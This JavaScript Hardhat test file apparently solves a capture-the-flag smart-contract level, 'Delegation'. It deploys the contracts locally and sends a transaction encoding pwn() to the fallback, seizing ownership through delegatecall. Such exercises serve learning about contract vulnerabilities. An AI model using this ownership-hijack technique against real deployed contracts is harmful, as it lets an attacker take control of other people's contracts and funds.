
const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require( "chai" );
const { ethers } = require("hardhat");

describe("Fallback", function () {
    // Deploys the Fallback contract
    async function deployFallback() {
        const [owner, otherAccount] = await ethers.getSigners();

        const Level6Delegate = await hre.ethers.getContractFactory("Delegate");
        const level6delegate = await Level6Delegate.deploy(owner.address);
        await level6delegate.deployed();

        const Level6 = await hre.ethers.getContractFactory("Delegation");
        const level6 = await Level6.deploy(level6delegate.address);
        await level6.deployed();

        console.log(
          `Level6 deployed at address ${level6.address}`
        )
        return {level6, owner, otherAccount};
    }

    /*
    The goal of this level is for you to claim ownership of the instance you are given.
    */
    describe("Solve", function() {
        it("Should solve level6", async function() {
            const {level6, owner, otherAccount} = await loadFixture(deployFallback);
            let ABI = ["function pwn()"];
            let iface = new ethers.utils.Interface(ABI);
            tx = { 
                to: level6.address,
                data: iface.encodeFunctionData("pwn")
            }
            const originalOwner = await level6.owner();
            expect(originalOwner == owner.address)
            await otherAccount.sendTransaction(tx);
            const newOwner = await level6.owner();
            expect(newOwner == otherAccount.address)
        })
    });
});